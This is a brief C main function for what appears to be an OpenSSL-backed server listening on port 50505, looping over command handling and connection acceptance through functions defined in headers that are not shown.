
#include <stdlib.h>
#include <openssl/ssl.h>
#include <openssl/sslerr.h>


#include "headers/secure_sockets.h"
#include "headers/shell.h"


int main() {
	int PORT = 50505;
	if (secure_network(PORT) == -1 ) {
		return 0;
	}
start:

	while (1) {
		commands();
		if (accept_connections() == -1) {
			printf("Error Accepting Connections \n");
			goto start;
		}
	}


	return 0;
}
